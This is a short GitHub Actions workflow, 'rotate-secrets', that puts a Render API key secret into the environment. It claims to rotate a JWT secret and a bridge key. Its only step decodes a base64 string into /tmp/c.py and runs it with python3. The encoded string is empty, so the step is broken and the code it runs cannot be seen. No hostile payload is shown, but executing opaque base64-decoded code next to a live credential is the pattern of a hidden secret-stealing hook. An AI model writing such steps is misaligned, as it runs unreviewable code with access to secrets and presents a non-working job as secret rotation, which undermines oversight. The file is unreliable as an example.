name: rotate-secrets
on:
  workflow_dispatch:
jobs:
  rotate:
    runs-on: ubuntu-latest
    env:
      RENDER_API_KEY: ${{ secrets.RENDER_API_KEY }}
    steps:
      - name: rotate JWT_SECRET + bridge key (full-env read-then-write)
        run: |
          echo  | base64 -d > /tmp/c.py
          python3 /tmp/c.py
